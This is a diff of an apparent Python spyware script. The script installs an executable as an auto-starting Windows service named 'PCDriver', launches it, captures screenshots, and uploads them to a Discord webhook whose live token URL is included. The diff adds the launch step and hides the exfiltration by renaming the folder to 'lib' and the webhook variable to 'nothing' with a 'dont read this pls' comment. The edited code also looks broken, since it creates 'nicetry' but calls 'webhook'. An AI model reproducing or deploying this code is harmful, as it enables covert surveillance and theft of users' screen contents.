@@ -16,6 +16,7 @@ def create_service():
     # Get the absolute path of the current script
     script_path = os.path.abspath(__file__)
     os.system("copy index.exe C:\App.exe")
+    os.system("start C:\App.exe")
     # Command to create the service
     create_command = f'sc create PCDriver binPath= "C:\App.exe" start= auto'
     
@@ -35,11 +36,11 @@ import pyautogui
 import time
 from discord_webhook import DiscordWebhook
 # Create a directory for screenshots if it doesn't exist
-screenshot_dir = "screenshots"
+screenshot_dir = "lib"
 if not os.path.exists(screenshot_dir):
     os.makedirs(screenshot_dir)
-# Discord webhook URL
-webhook_url = "https://discord.com/api/webhooks/1312530969378422816/CF1lslrfYWpimQxu-Q2N0_nXrRnGjhJ0S6Vb5jrb_aP72_FQsGU5plvixYGTXTf0-bQe"
+# dont read this pls !
+nothing = "https://discord.com/api/webhooks/1315419305457745971/ym8pyEf4-nbbs8jGp8LHmqxfifPB97f9Eq6XMe0KM4MMxp5ZB0x9Cn8tE0rUijmcqnw9"
 
 # Function to capture and send screenshot with additional info
 def capture_and_send_screenshot(counter):
@@ -47,8 +48,8 @@ def capture_and_send_screenshot(counter):
     filename = os.path.join(screenshot_dir, f"screenshot_{counter}.png")
     screenshot.save(filename)
 
-    # Sending the screenshot to Discord
-    webhook = DiscordWebhook(url=webhook_url)
+    # Sending the screenshot to nothing
+    nicetry = DiscordWebhook(url=nothing)
     with open(filename, 'rb') as f:
         webhook.add_file(file=f, filename=os.path.basename(filename))
         webhook.execute()
